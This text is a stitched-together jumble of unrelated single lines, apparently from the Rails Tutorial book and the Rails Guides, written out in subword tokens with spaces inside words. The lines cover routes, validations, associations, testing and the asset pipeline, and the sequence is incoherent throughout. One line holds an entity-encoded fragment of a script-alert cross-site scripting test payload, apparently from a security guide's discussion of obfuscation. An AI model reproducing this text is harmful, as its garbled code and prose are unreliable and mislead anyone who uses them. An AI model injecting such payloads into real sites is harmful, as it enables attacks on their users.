▁create ▁app / views / microposts / edit ▖ html ▖ erb
▁As ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : motivation }, ▁Rails ▁defines ▁a ▁special ▁function ▁to ▁include ▁stylesheets , ▁and
▁The ▁return ▁value ▁of ▁` to _ param ` ▁should ▁** not ** ▁be ▁escape d :
▁# ▁image _ tag (" icon ▖ png ")
▁ / users /1/ edit
▁ Refactor ing
▁Whi ch ▁one ▁you ▁use ▁is ▁really ▁a ▁matter ▁of ▁style ▁and ▁convention , ▁but ▁the ▁rule ▁of ▁thumb ▁is ▁to ▁use ▁the ▁simple st ▁one ▁that ▁make s ▁sense ▁for ▁the ▁code ▁you ▁are ▁writing .
▁You ▁can ▁run ▁a ▁single ▁test ▁through ▁ ruby ▖
▁The ▁most ▁pro m in ent ▁Rails ▁IDE s ▁are ▁\ href { http :// www ▖ a p t an a ▖ com / rails /}{ R ad Rails } ▁and ▁\ href { http :// www ▖ j e t b ra in s ▖ com / ruby / index ▖ html } { Ruby M in e } .
▁To ▁get ▁them ▁to ▁pass , ▁we ▁have ▁to ▁create ▁a ▁signup ▁page ▁with ▁just ▁the ▁right ▁elements , ▁arrange ▁for ▁the ▁page ' s ▁submission ▁to ▁be ▁route d ▁to ▁the ▁right ▁place , ▁and ▁successfully ▁create ▁a ▁new ▁user ▁in ▁the ▁database ▁only ▁if ▁the ▁result ing ▁user ▁data ▁is ▁valid .
▁Rails ▁includes ▁methods ▁to ▁help ▁you ▁validate ▁the ▁data ▁that ▁you ▁send ▁to ▁models ▖╼
▁That ' s ▁the ▁file ▁the ▁code ▁in ▁the ▁block ▁actually ▁write s ▁to ▖
▁validates ▁: password , ▁length : ▁ { ▁in : ▁6 ▖ ▖ 20 ▁ }
▁De p end ent : ▁destroy
▁ Spring if y ▁your ▁bin stub s ▁with ▁` bundle ▁exec ▁ spring ▁bin stub ▁-- all ` .
▁### ▁ AssetTagHelper
▁Note ▁that ▁if ▁you ▁want ▁to ▁immediately ▁require ▁ dependencies ▁when ▁the ▁engine ▁is ╼ require d , ▁you ▁should ▁require ▁them ▁before ▁the ▁engine ' s ▁initialization ▖
▁There ▁is ▁an ▁analogous ▁command ▁for ▁making ▁a ▁model : ▁\ k ode { generate ▁model } .
▁ assoc ▖ has _ many ▁: invoices
▁The ▁application ▁code ▁for ▁email ▁format ▁validation ▁uses ▁the ▁\ k ode { format } ▁validation , ▁which ▁works ▁like ▁this :
▁So ▁first , ▁we ' ll ▁ w i re ▁up ▁the ▁Article ▁show ▁template ╼ ( ` app / views / articles / show ▖ html ▖ erb ` ) ▁to ▁let ▁us ▁make ▁a ▁new ▁comment :
▁A lthough ▁we ' ll ▁keep ▁individual ▁user ▁\ k ode { show } ▁pages ▁ visible ▁to ▁all ▁site ▁visit or s , ▁the ▁user ▁\ k ode { index } ▁will ▁be ▁restrict ed ▁to ▁logged - in ▁users ▁so ▁that ▁there ' s ▁a ▁ limit ▁to ▁how ▁much ▁un register ed ▁users ▁can ▁see ▁by ▁default
▁* ▁[ Rails ▁3 ▁Re m o te ▁Link s ▁and ▁ Form s : ▁A ▁Defin i tive ▁G u ide ]( http :// www ▖ al fa ja n g o ▖ com / blog / rails - 3- remote - links - and - form s / )
▁These ▁are ▁covered ▁in ▁[ Test ing ▁Rails ▁Application s ]( testing ▖ html ) .
▁In ▁above ▁examples ▁" dear " ▁get s ▁ cut ▁first , ▁but ▁then ▁`: separator ` ▁prevent s ▁it .
▁It ▁also ▁creates ▁a ▁minimal ▁test ▁for ▁the ▁new ▁user ▁page ▁( Listing ~\ ref { code : user _ new _ test }), ▁which ▁should ▁current ly ▁pass :
▁These ▁helpers ╼ do ▁exactly ▁the ▁same ▁thing , ▁m o un ting ▁pieces ▁of ▁the ▁engines ' s ▁functionality ▁at ▁a ╼ pre - defined ▁path ▁which ▁may ▁be ▁custom i z able .
▁If ▁the ▁route ▁above ▁is ▁ modified ▁to ▁be :
▁#### ▁C on version ▁and ▁Co er c ion
▁Option ▁to ▁ en code ▁` BigDecimal ` ▁objects ▁as ▁number s ▁instead ▁of ▁strings
▁Here ▁we ' ve ▁used ▁the ▁\ k ode { t ogg le !} \ ▁method ▁to ▁f li p ▁the ▁\ k ode { admin } ▁attribute ▁from ▁\ k ode { false } ▁to ▁\ k ode { true } .
▁$ ▁bundle ▁exec ▁rake ▁test ╼ ActionView :: Missing Template : ▁ Missing ▁template ▁static _ pages / about
▁* ▁` collection ▖ build ( attributes ▁= ▁{}) `
▁( L ac k ing ▁the ▁pa t i ence ▁to ▁wait ▁two ▁hours , ▁we ' ll ▁cover ▁the ▁third ▁branch ▁in ▁a ▁test , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : activation _ resets _ exercises })▖)
▁Like ▁sessions ▁and ▁account ▁ activations , ▁password ▁resets ▁can ▁be ▁model ed ▁as ▁a ▁resource ▁ de s p ite ▁not ▁being ▁Active ▁Record ▁objects .
▁These ▁are ▁not ▁cause ▁for ▁concern ▖)
▁Defaults ▁to ▁` ▖ html ` .
▁ Array s ▁return ▁the ▁result ▁of ▁apply ing ▁` to _ query ` ▁to ▁each ▁element ▁with ▁` _ key _ [ ]` ▁as ▁key , ▁and ▁join ▁the ▁result ▁with ▁" & " :
▁ http :// www ▖ example ▖ com / users /1/ edit
▁=> ▁[" c ", ▁" g ", ▁" l ", ▁" k ", ▁" h ", ▁" z ", ▁" s ", ▁" i ", ▁" n ", ▁" d ", ▁" y ", ▁" u ", ▁" t ", ▁" j ", ▁" q ",
▁Date ▖ new (200 0, ▁1, ▁31)▖ next _ month ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁For ▁example , ▁you ▁would ▁like ▁` / profile ` ▁to ▁always ▁show ▁the ▁profile ▁of ▁the ▁current ly ▁logged ▁in ▁user ▖
▁NOTE : ▁By ▁default , ▁if ▁you ▁use ▁the ▁`: plain ` ▁option , ▁the ▁text ▁is ▁rendered ▁without ╼ using ▁the ▁current ▁layout ▖
▁The ▁method ▁` reverse _ update ` ▁is ▁an ▁alias ▁for ▁` reverse _ merge !` , ▁explained ▁above .
▁Then ▁restart ▁the ▁web ▁server ▁to ▁incorporate ▁the ▁changes ▁into ▁the ▁development ▁application .
▁if ▁options [: counter _ cache ] ▁== ▁true
▁See ▁the ▁next ▁section ▁for ▁the ▁preferred ▁way ▁to ▁handle ▁conditions ▁using ▁an ▁array .
▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ create _ action } .
▁resources ▁: d ra f t s
▁All ▁you ▁have ▁to ▁do ▁is ▁to ╼ s ub class ▁the ▁` ActiveRecord :: Base ` ▁class ▁and ▁you ' re ▁good ▁to ▁go :
▁<%= ▁form _ for ▁: article , ▁url : ▁article _ path (@ article ), ▁method : ▁: patch ▁do ▁| f | ▁%>
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }) .
▁Tests ▁for ▁the ▁user ▁\ k ode { update } ▁action .
▁Now ▁that ▁we ' ve ▁customize d ▁our ▁site ' s ▁pages ▁and ▁go tt en ▁a ▁good ▁start ▁on ▁the ▁test ▁suite , ▁let ' s ▁set ▁the ▁application ' s ▁root ▁route ▁before ▁mov ing ▁on .
▁A ▁test ▁for ▁protect ing ▁the ▁\ k ode { destroy } ▁action .
▁To ▁implement ▁the ▁ forwarding ▁behavior ▁show n ▁in ▁Figure ~\ ref { fig : login _ page _ protected _ mockup _ bootstrap }, ▁we ' ll ▁use ▁a ▁\ emph { before ▁filter } ▁in ▁the ▁Users ▁controller .
▁Let ' s ▁take ▁a ▁ minute ▁to ▁show ▁just ▁one ▁of ▁them ▁by ▁re na m ing ▁the ▁application ▁as ▁follows :
▁In ▁this ▁case , ▁Rails ▁will ▁see ▁that ▁`@ magazine ` ▁is ▁a ▁` Magazine ` ▁and ▁`@ ad ` ▁is ▁an ▁` A d ` ▁and ▁will ▁therefore ▁use ▁the ▁` magazine _ ad _ path ` ▁helper ▖
▁< script ▁src ="/ assets / core ▖ js ?
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ be t a 2 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁You ▁may ▁have ▁notice d ▁in ▁Section ~\ ref { sec : a _ working _ follow _ button _ the _ standard _ way } ▁that ▁both ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁in ▁the ▁Relationship s ▁controller ▁simply ▁redirect ▁\ emph { back } ▁to ▁the ▁original ▁profile .
▁#### # ▁` collection ▖ empty ?
▁When ╼ you ▁are ▁ready , ▁you ▁can ▁opt ▁into ▁the ▁new ▁behavior ▁and ▁remove ▁the ╼ d eprecation ▁ warning ▁by ▁adding ▁following ▁configuration ▁to ▁your ╼` config / application ▖ rb `:
▁The ▁method ▁` many ?` ▁is ▁shorthand ▁for ▁` collection ▖ size ▁> ▁1 `:
▁This ▁produce s :
▁### ▁ Delete
▁E verything ▁in ▁Ruby ▁is ▁an ▁object .
▁$ ▁rails ▁console ▁-- sandbox
▁Gravatar ▁is ▁a ▁free ▁ service ▁that ▁allows ▁users ▁to ▁upload ▁images ▁and ▁associate ▁them ▁with ▁email ▁addresses ▁they ▁control .
▁Note ▁that ▁this ▁option ▁was ▁added ▁as ▁a ▁security ▁me a sure , ▁to ▁ensure ▁user ▁input ╼ cannot ▁be ▁used ▁as ▁ locale ▁information ▁unless ▁it ▁is ▁previous ly ▁known ▖
▁By ▁default , ▁the ▁exception ▁is ▁handle d ▁by ▁respond ing ▁with ▁4 06 ▁ Not ▁A c ce p table , ▁but ▁you ▁can ▁override ▁that ▁now ▖
▁No ▁authentication .
▁Because ▁sever al ▁readers ▁report ed ▁ having ▁trouble , ▁I ' ve ▁added ▁\ k ode { heroku ▁run ▁rake ▁db : migrate } ▁as ▁a ▁final ▁step ▁just ▁to ▁be ▁ safe .
▁In ▁the ▁\ k ode { div } ▁tag , ▁the ▁\ k ode { her o - unit } ▁CSS ▁class ▁has ▁a ▁special ▁meaning ▁to ▁Bootstrap , ▁as ▁do ▁the ▁\ k ode { btn }, ▁\ k ode { btn - large }, ▁and ▁\ k ode { btn - primary } ▁classes ▁in ▁the ▁signup ▁button .
▁To ▁understand ▁where ▁this ▁page ▁comes ▁from , ▁let ' s ▁start ▁by ▁tak ing ▁a ▁look ▁at ▁the ▁Static ▁Pages ▁controller ▁in ▁a ▁text ▁editor , ▁which ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : static _ pages _ controller } .
▁This ▁is ▁only ▁useful ▁if ▁\ k ode { current \_ user } ▁is ▁used ▁more ▁than ▁once ▁for ▁a ▁single ▁user ▁request ; ▁in ▁any ▁case , ▁\ k ode { find \_ by } ▁will ▁be ▁called ▁at ▁least ▁once ▁every ▁time ▁a ▁user ▁visit s ▁a ▁page ▁on ▁the ▁site .
▁Thu s , ▁the ▁\ k ode { each } ▁method ▁for ▁a ▁hash ▁iterate s ▁through ▁the ▁hash ▁one ▁key - value ▁\ emph { p a ir } ▁at ▁a ▁time .
▁Let ' s ▁break ▁this ▁down ▁into ▁pieces .
▁The ▁first ▁feature ▁of ▁the ▁pipeline ▁is ▁to ▁concatenate ▁assets , ▁which ▁can ▁reduce ▁the ╼ number ▁of ▁requests ▁that ▁a ▁browser ▁make s ▁to ▁render ▁a ▁web ▁page ▖
▁A ▖ new ▖ x ▁= ▁1 ▁# ▁ NoMethodError
▁Create s ▁a ▁standard ▁input ▁field ▁of ▁url ▁type .
▁( You ▁m ight ▁see ▁some ▁d eprecation ▁ warning s ▁at ▁this ▁point , ▁which ▁you ▁should ▁ignore ▖)
▁Fin ally , ▁we ' ll ▁ ment ion ▁a ▁method ▁for ▁running ▁tests ▁directly ▁inside ▁S ublime ▁Text , ▁a ▁technique ▁es pecially ▁useful ▁when ▁used ▁in ▁con c er t ▁with ▁Spork .
▁Re placing ▁the ▁direct ▁compar is on ▁with ▁the ▁boolean ▁method ▁gives ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : correct _ user _ before _ filter _ boolean } .
▁ Adding ▁the ▁Bootstrap ▁JavaScript ▁library ▁to ▁\ k ode { application ▖ js } .
▁ Proc ess V ide o J ob ▖ perform _ later ( V ide o ▖ last )
▁in ▁Listing ~\ ref { code : initial _ signin _ page } .
▁[ Hash ▁conditions ](# hash - condition s ) ▁provides ▁a ▁special ▁syntax ▁for ▁specify ing ▁conditions ▁for ▁the ▁join ed ▁table s :
▁So , ▁if ▁you ▁have ▁an ▁API ▁that ▁get s ▁real ▁ PUT ▁requests ▁it ▁is ▁going ▁to ▁work .
▁from ▁Listing ~\ ref { code : sign _ in _ helper } ▁to
▁When ▁document ing ▁parts ▁of ▁Rails ▁API , ▁it ' s ▁important ▁to ▁remember ▁all ▁of ▁the ╼ p i ec es ▁that ▁go ▁into ▁the ▁Rails ▁ stack .
▁NOTE : ▁To ▁help ▁our ▁C I ▁server s ▁you ▁should ▁add ▁[ ci ▁skip ] ▁to ▁your ▁documentation ▁commit ▁message ▁to ▁skip ▁build ▁on ▁that ▁commit ▖
▁We ' ll ▁call ▁our ▁action ▁\ k ode { hello } ▁and ▁place ▁it ▁in ▁the ▁Application ▁controller .
▁ Content s ▁of ▁the ▁sample ▁app ' s ▁\ k ode { config } ▁directory ▖ ~\ href { http :// railstutorial ▖ org / images / figures / config _ directory _ rails _ 4 - full ▖ png }{( full ▁size )}
▁ Not ▁all ▁clients ▁prefer ▁HTML ▁email s ,╼ and ▁so ▁sending ▁both ▁is ▁best ▁practice ▖
▁Setting ▁up ▁a ▁production ▁site ▁to ▁use ▁SSL ▁involve s ▁p ur cha s ing ▁and ▁ configuring ▁an ▁\ emph { SSL ▁c er t if ic ate } ▁for ▁your ▁domain .
▁We ' ll ▁then ▁create ▁our ▁first ▁Rails ▁application , ▁called ▁\ k ode { hello \_ app } .
▁< td > <%= ▁article ▖ title ▁%></ td >
▁On ▁some ▁systems ▁you ▁m ight ▁have ▁to ▁restart ▁the ▁web ▁server ▁( using ▁ Ctrl - C ) ▁for ▁the ▁changes ▁to ▁take ▁effect .
▁=> ▁[" f ", ▁" w ", ▁" i ", ▁" a ", ▁" h ", ▁" p ", ▁" c ", ▁" x "]
▁T a k en ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁params ▖ require (: comment )▖ permit (: comment er , ▁: body )
▁ Adding ▁account ▁activation ▁to ▁the ▁user ▁signup ▁test ▖
▁< h 1> Contact s </ h 1>
▁A ▁mockup ▁of ▁the ▁user ▁edit ▁page .
▁To ▁change ▁the ▁default ▁mailer ▁view ▁for ▁your ▁action ▁you ▁do ▁something ▁like :
▁In ▁all ▁three ▁cases , ▁ ob serv e ▁that ▁each ▁micropost ▁display ▁indicates ▁the ▁time ▁since ▁it ▁was ▁created ▁( e ▖ g ▖ , ▁`` P o s ted ▁1 ▁ minute ▁ ago ▖ '') ; ▁this ▁is ▁the ▁work ▁of ▁the ▁\ k ode { time \_ ago \_ in \_ words } ▁method ▁from ▁Listing ~\ ref { code : micropost _ partial } .
▁| ▁| ▁10 1 ▁| ▁: s w it ch ing _ proto col s ▁|
▁Note ▁that , ▁since ▁it ▁is ▁the ▁page ▁for ▁a ▁new ▁session , ▁the ▁signin ▁page ▁live s ▁in ▁the ▁file ▁\ k ode { app / views / sessions / new ▖ html ▖ erb }, ▁which ▁we ▁have ▁to ▁create .
▁The ▁Home ▁page ▁after ▁ deleting ▁the ▁second - most - recent ▁micropost .
▁\ chapter { From ▁ zero ▁to ▁deploy } ▁% ▁( fold )╼\ label { cha : beginning }╼╼
▁</ select >
▁### ▁ Test ▁Co verage
▁As ▁JSON ▁Patch ▁was ▁only ▁ recent ly ▁made ▁into ▁an ▁R F C , ▁there ▁are n ' t ▁a ▁lot ▁of ▁great ╼ Ruby ▁libraries ▁yet ▖
▁def ▁middleware
▁After ▁you ▁create ▁the ▁blog ▁application , ▁switch ▁to ▁its ▁folder :
▁We ▁can ▁mix ▁and ▁match ▁` scope ` ▁and ▁` where ` ▁conditions ▁and ▁the ▁final ▁ sql ╼ will ▁have ▁all ▁conditions ▁join ed ▁with ▁` AND ` .
▁as ▁seen ▁in ▁Listing ~\ ref { code : allow _ blank _ password } .
▁To ▁examine ▁the ▁relationship ▁between ▁the ▁Users ▁controller ▁and ▁the ▁User ▁model , ▁let ' s ▁focus ▁on ▁a ▁ simplified ▁version ▁of ▁the ▁\ k ode { index } ▁action , ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ action } .
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁REST ▁actions ▁for ▁the ▁Users ▁resource ▁( Table ~\ ref { table : RESTful _ users }) ▁by ▁adding ▁\ k ode { edit }, ▁\ k ode { update }, ▁\ k ode { index }, ▁and ▁\ k ode { destroy } ▁actions .
▁* ▁`: less _ than _ or _ equal _ to ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁less ▁than ▁or ▁equal ▁the ╼ ▁supplied ▁value ▖
▁<%= ▁form _ tag (' / articles ', ▁remote : ▁true ) ▁do ▁%>
▁# ▁Use ▁ jquery ▁as ▁the ▁JavaScript ▁library
▁One ▁reason ▁is ▁to ▁catch ▁implementation ▁errors , ▁as ▁discuss ed ▁in ▁a ▁moment .
▁When ▁access ing ▁the ▁engine ▁through ▁` http :// localhost :3000/ blog `, ▁the ╼ articles ▁will ▁be ▁empty ▖
▁S at , ▁ 22 ▁Sep ▁2012 ▁ 23:59:59 ▁UTC ▁+00:00
▁* ▁A ▁layout ▁view ▁template ▁for ▁the ▁engine
▁@ assembly ▁= ▁@ part ▖ assemblies ▖ find (1)
▁" SSL Error "▖ underscore ▖ camelize ▁# ▁=> ▁" SSL Error "
▁It ' s ▁time ▁to ▁create ▁the ▁form ▁for ▁a ▁new ▁article .
▁We ▁pass ▁the ▁named ▁route ▁as ▁the ╼ second ▁argument , ▁and ▁then ▁the ▁options ▁as ▁another ▁argument ▖
▁To ▁set ▁up ▁the ▁application ▁to ▁use ▁Cucumber , ▁we ▁next ▁generate ▁some ▁necessary ▁support ▁files ▁and ▁directories :
▁% w ( foo ▁bar ▁ baz )▖ sum ▁# ▁=> ▁" foobar baz "
▁require ▁' active _ support / core _ ext '
▁The ▁` require `╼ directive ▁is ▁used ▁to ▁tell ▁Sprockets ▁the ▁files ▁you ▁wish ▁to ▁require ▖
▁If ▁you ▁have ▁a ▁` config / database ▖ yml ` ▁but ▁no ▁` ENV [' DAT A BASE _ URL ']` ▁then ▁this ▁file ▁will ▁be ▁used ▁to ▁ connect ▁to ▁your ▁database :
▁The ▁result ing ▁clean ed - up ▁views ▁appear ▁in ▁Listing ~\ ref { code : home _ view _ interior }, ▁Listing ~\ ref { code : help _ view _ interior }, ▁and ▁Listing ~\ ref { code : about _ view _ interior } .
▁You ▁could ▁do :
▁t ▖ text ▁: body
▁( In ▁this ▁sense , ▁\ k ode { respond \_ to } ▁is ▁more ▁like ▁an ▁if - the n - else ▁statement ▁than ▁a ▁series ▁of ▁ s equ en tial ▁lines ▖)
▁With ▁partials , ▁you ▁can ▁ extract ▁pieces ▁of ▁code ▁from ▁your ▁templates ▁to ▁separate ▁files ▁and ▁also ▁reuse ▁them ▁throughout ▁your ▁templates .
▁ ╼ ▁=> ▁- 1
▁* ▁Running ▁` rake ▁ doc : guides ` ▁will ▁put ▁a ▁full ▁copy ▁of ▁the ▁Rails ▁Guides ▁in ▁the ╼ ▁` doc / guides ` ▁folder ▁of ▁your ▁application ▖
▁< th ▁ col span =" 3 "></ th >
▁# ▁ slash es ▖
▁This ▁custom ▁store ▁must ▁be ▁defined ▁as ▁` ActionDispatch :: Session :: M y Custom Store ` .
▁You ▁can ▁define ▁your ▁own ▁custom ▁ environments ▁as ▁well ; ▁see ▁the ▁\ href { http :// r ailscasts ▖ com / episodes / 7 2 - adding - an - environment } { RailsCast ▁on ▁adding ▁an ▁environment } ▁for ▁details .
▁Rails ▁generally ▁ st a y s ▁close ▁to ▁the ▁latest ▁release d ▁Ruby ▁version ▁when ▁it ' s ▁release d :
▁# ▁=> ▁{" " => nil , ▁ "1" =>1 , ▁" nested "=>{" a " => 3 , ▁"5" => 5}}
▁create ▁app / assets / javascripts / users ▖ js ▖ coffee
▁The ▁method ▁for ▁ authenticating ▁users ▁will ▁be ▁to ▁take ▁a ▁submitted ▁password , ▁hash ▁it , ▁and ▁compare ▁the ▁result ▁to ▁the ▁ hashed ▁value ▁store d ▁in ▁the ▁database .
▁M ▁= ▁X :: Y :: Z
▁With ▁all ▁the ▁work ▁making ▁templates ▁for ▁user ▁microposts ▁in ▁Section ~\ ref { sec : augment ing _ the _ user _ show _ page }, ▁the ▁end ing ▁was ▁rather ▁an tic li ma c tic .
▁Let ' s ▁get ▁to ▁it .
▁Pass ing ▁` true ` ▁to ▁the ▁`: polymorphic ` ▁option ▁indicates ▁that ▁this ▁is ▁a ▁ polymorphic ▁association ▖
▁* ▁In ▁Rails ▁4▖0 , ▁pre compiling ▁assets ▁no ▁longer ▁automatically ▁copie s ▁non - JS / CSS ▁assets ▁from ▁` vendor / assets ` ▁and ▁` lib / assets ` ▖
▁ //= ▁require ▁ jquery _ ujs
▁Rails ▁comes ▁with ▁ s en s ible ▁default ▁manifest ▁files , ▁and ▁in ▁the ▁\ emph { Rails ▁Tutorial } ▁we ▁won ' t ▁need ▁to ▁make ▁any ▁changes , ▁but ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / asset _ pipeline ▖ html } { Rails ▁Guides ▁entry ▁on ▁the ▁asset ▁pipeline } ▁has ▁more ▁detail ▁if ▁you ▁need ▁it .
▁This ▁would ▁add ▁something ▁like ▁" Proc ess ▁data ▁files ▁( 0 ▖ 3 45 23 ) " ▁to ▁the ▁log , ▁which ▁you ▁can ▁then ▁use ▁to ▁compare ▁t im ing s ▁when ▁opt im i z ing ▁your ▁code .
▁& # 1 08 ; & # 10 1 ; & # 1 14 ; & # 1 16 ; & # 4 0 ; & # 3 9 ; & # 88 ; & # 8 3 ; & # 8 3 ; & # 3 9 ; & # 4 1 ; >
▁O p en ▁the ▁` app / views / welcome / index ▖ html ▖ erb ` ▁file ▁in ▁your ▁text ▁editor ▖
▁With ▁the ▁association ▁thus ▁made , ▁we ▁can ▁update ▁the ▁\ k ode { setup } ▁method ▁in ▁Listing ~\ ref { code : micropost _ validity _ test } ▁with ▁the ▁ idiomatic ally ▁correct ▁way ▁to ▁build ▁a ▁new ▁micropost , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validity _ test _ idiomatic } .
▁< script >
▁select _ datetime ()
▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁user name , ▁we ▁open ▁the ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date ▁( Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }) .
▁# ▁< contributor >
▁In ▁addition , ▁a lthough ▁it ' s ▁unlike ly ▁ever ▁to ▁be ▁a ▁problem , ▁there ' s ▁a ▁chance ▁that ▁a ▁user ' s ▁email ▁address ▁could ▁over run ▁the ▁ maximum ▁length ▁of ▁strings , ▁which ▁for ▁many ▁database s ▁is ▁2 55 .
▁< td > <%= ▁b ▁%></ td >
▁B re v ity ▁is ▁a ▁plus : ▁get ▁to ▁the ▁point .
▁options ▁= ▁ args ▖ extract _ options !
▁This ▁method ▁receive s ▁a ▁hash ▁with ▁keys ▁`: years `, ▁`: months `, ▁`: weeks `, ▁`: day s `, ▁`: hour s `, ▁`: minute s `, ▁and ▁`: seconds `, ▁and ▁returns ▁a ▁ datetime ▁advanced ▁as ▁much ▁as ▁the ▁present ▁keys ▁indicate .
▁With ▁this ▁template ▁in ▁place , ▁we ▁can ▁general ize ▁the ▁method ▁by ▁adding ▁a ▁function ▁argument ▁with ▁the ▁name ▁of ▁the ▁digest , ▁and ▁then ▁use ▁string ▁inter p ol ation ▁as ▁above :
▁If ▁it ▁fails , ▁we ▁simply ▁f all ▁back ▁on ▁the ▁behavior ▁ developed ▁in ▁Section ~\ ref { sec : signup _ failure } .
▁As ▁long ▁as ▁you ▁start ▁your ▁symbols ▁with ▁a ▁letter ▁and ▁ s tic k ▁to ▁normal ▁word ▁characters , ▁you ▁should ▁be ▁fine .
▁Change ▁the ▁content ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action } ▁to ▁read ▁`` hola , ▁ mundo !''
▁content _ type : ▁" text / plain ",
▁And ▁when ▁we ' re ▁writing ▁application ▁code ▁that ▁isn ' t ▁particular ly ▁brittle ▁or ▁error - prone , ▁or ▁is ▁likely ▁to ▁change ▁( as ▁is ▁often ▁the ▁case ▁with ▁views ), ▁we ' ll ▁often ▁skip ▁testing ▁ al to get her .
▁It ' s ▁time ▁to ▁add ▁a ▁second ▁model ▁to ▁the ▁application ▖
▁The ▁cloud ▁IDE ▁( Section ~\ ref { sec : development _ environment }) ▁includes ▁such ▁a ▁line ▁by ▁default .
▁Code ▁to ▁get ▁a ▁passing ▁test ▁for ▁the ▁Home ▁page .
▁has _ many ▁: invoices , ▁ dependent : ▁: destroy
▁By ▁following ▁this ▁pattern , ▁we ▁can ▁arrange ▁to ▁display ▁the ▁contents ▁of ▁the ▁flash ▁site - wide ▁using ▁code ▁like ▁this :
▁The ▁final ▁piece ▁of ▁the ▁relationships ▁p u z z le ▁is ▁to ▁add ▁a ▁\ k ode { user ▖ followers } ▁method ▁to ▁go ▁with ▁\ k ode { user ▖ followed \_ users } .
▁\ emph { String s } ▁are ▁ probably ▁the ▁most ▁important ▁data ▁structure ▁for ▁web ▁applications , ▁since ▁web ▁pages ▁ ultimate ly ▁consist ▁of ▁strings ▁of ▁characters ▁sent ▁from ▁the ▁server ▁to ▁the ▁browser .
▁root ▁to : ▁' pages # main '
▁To ▁be ▁able ▁to ▁contribute ▁code , ▁you ▁need ▁to ▁ clone ▁the ▁Rails ▁repository :
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : remember _ method }
▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } .
▁class ▁ Product sController ▁< ▁Application Controller
▁Now ▁the ▁behavior ▁is ▁clear , ▁that ▁we ▁are ▁only ▁using ▁the ▁connection ▁information ▁in ▁` ENV [' DAT A BASE _ URL ']` .
▁ NoMethodError : ▁undefined ▁method ▁` to _ a ' ▁for ▁ 9 : Fi x n um
▁The ▁user ▁index ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁delete ▁links ▖ ~\ href { http :// railstutorial ▖ org / images / figures / index _ delete _ links _ rails _ 3 _ bootstrap - full ▖ png }{( full ▁size )}
▁With ▁the ▁asset ▁pipeline , ▁in ▁production ▁all ▁the ▁application ▁stylesheets ▁get ▁roll ed ▁into ▁one ▁CSS ▁file ▁(\ k ode { application ▖ css }), ▁all ▁the ▁application ▁JavaScript ▁code ▁get s ▁roll ed ▁into ▁one ▁JavaScript ▁file ▁(\ k ode { javascripts ▖ js }), ▁and ▁all ▁such ▁files ▁( including ▁those ▁in ▁\ k ode { lib / assets } ▁and ▁\ k ode { vendor / assets }) ▁are ▁\ emph { mini fi ed } ▁to ▁remove ▁the ▁unnecessary ▁whitespace ▁that ▁ blo at s ▁file ▁size .
▁assemblies ( force _ reload ▁= ▁false )
▁That ▁is ▁used ▁by ▁Active ▁Record ▁in ▁its ▁support ▁for ▁ range ▁values ▁in ▁conditions .
▁If ▁you ' re ▁new ▁to ▁object - or i ent ed ▁programming , ▁this ▁may ▁ s ound ▁like ▁g i b be ri sh , ▁so ▁let ' s ▁look ▁at ▁some ▁con c re te ▁examples .
▁* ▁` collection ▖ create ( attributes ▁= ▁{}) `
▁ ╼\ end { code }╼╼ ▁\ subsection { The ▁basic ▁model } ▁% ▁( fold )╼ ▁\ label { sec : the _ basic _ model }╼╼
▁Note ▁that ▁this ▁means ▁un check ing ▁the ▁ box ▁will ▁log ▁out ▁the ▁user ▁on ▁all ▁browsers ▁on ▁all ▁computer s .
▁The ▁ Spring ▁server ▁is ▁ still ▁a ▁little ▁ q u ir k y ▁as ▁of ▁this ▁writing , ▁and ▁some times ▁ Spring ▁\ emph { process es } ▁will ▁a cc um ul ate ▁and ▁ s low ▁perform ance ▁of ▁your ▁tests .
▁Now ▁it ' s ▁time ▁to ▁add ▁an ▁About ▁page ▁to ▁our ▁application .
▁create ▁app / models / micropost ▖ rb
▁Client ▖ joins (: orders )▖ where ( orders : ▁ { ▁created _ at : ▁time _ range ▁ })
▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁also ▁uses ▁the ▁\ k ode { assigns } ▁method ▁for ▁the ▁first ▁time ▁in ▁the ▁main ▁tutorial ; ▁as ▁explained ▁in ▁the ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁exercise ▁( Section ~\ ref { sec : log _ in _ out _ exercises }), ▁\ k ode { assigns } ▁let s ▁us ▁access ▁instance ▁variables ▁in ▁the ▁corresponding ▁action .
▁All ▁we ' ve ▁done ▁so ▁far ▁is ▁write ▁some ▁plain ▁text , ▁so ▁it ▁should n ' t ▁be ▁surpris ing ▁that ▁the ▁Cucumber ▁scenario s ▁are n ' t ▁yet ▁passing .
▁=> ▁ BasicObject
